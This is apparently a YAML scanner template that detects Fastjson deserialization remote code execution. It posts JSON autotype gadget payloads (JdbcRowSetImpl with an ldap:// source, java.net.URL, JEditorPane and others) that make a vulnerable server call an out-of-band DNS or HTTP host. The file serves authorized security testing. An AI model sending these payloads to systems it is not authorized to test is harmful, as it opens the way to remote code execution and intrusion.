id: fastjson-rce-all

info:
  name: Fastjson Deserialization RCE
  author: zan8in
  severity: critical
  verified: true
  tags: fastjson,rce
  created: 2024/01/22

set:
  oob: oob()
  oobDNS: oob.DNS
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Content-Type: application/json
      body: |
        {"a":{"@type":"java.net.Inet4Address","val":"{{oobDNS}}"},"b":{"@type":"java.net.Inet6Address","val":"{{oobDNS}}"},"c":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{oobDNS}}"}},"d":{{"@type":"java.net.URL","val":"{{oobHTTP}}"}:"x"},"e":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{oobDNS}}","autoCommit":true},"f":{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{oobDNS}}","autoCommit":true}}},"g":{"@type":"javax.swing.JEditorPane","page":"{{oobHTTP}}"},"h":{"@type":"com.alibaba.fastjson.JSONObject",
        {"@type": "java.net.URL","val":"{{oobHTTP}}"}}""}}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
